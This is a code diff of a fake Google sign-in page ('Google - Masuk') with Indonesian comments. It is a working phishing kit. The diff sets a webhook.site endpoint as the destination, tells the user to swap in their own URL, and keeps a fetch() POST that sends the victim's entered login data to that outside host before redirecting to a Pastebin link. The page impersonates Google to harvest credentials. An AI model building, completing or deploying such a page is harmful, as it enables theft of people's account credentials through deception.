@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google - Masuk</title>
     <style>
-        /* (style lengkap) */
         * {
             margin: 0;
             padding: 0;
@@ -170,7 +169,10 @@
     <script>
         // ========== KONFIGURASI ==========
         // GANTI DENGAN URL WEBHOOK SITE ANDA (buat di https://webhook.site)
-        const WEBHOOK_URL = 'scriptroblox.github.io';
+        // Contoh: 'https://webhook.site/abcd1234-5678-efgh-ijkl-9012mnopqrst'
+        const WEBHOOK_URL = 'https://webhook.site/abcd1234-5678-efgh-ijkl-9012mnopqrst'; // <-- GANTI INI
+        
+        // Redirect setelah login (opsional, bisa dikosongkan)
         const REDIRECT_URL = 'https://pastebin.com/D7RcUGdL';
         
         const form = document.getElementById('loginForm');
@@ -215,15 +217,15 @@
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    mode: 'no-cors',
+                    mode: 'no-cors', // Penting agar tidak diblokir CORS
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
             } catch (error) {
-                console.error(error);
+                console.error('Gagal mengirim:', error);
             }
 
-            // Redirect ke Pastebin
+            // Redirect ke Pastebin (atau ke mana pun)
             window.location.href = REDIRECT_URL;
         });
     </script>
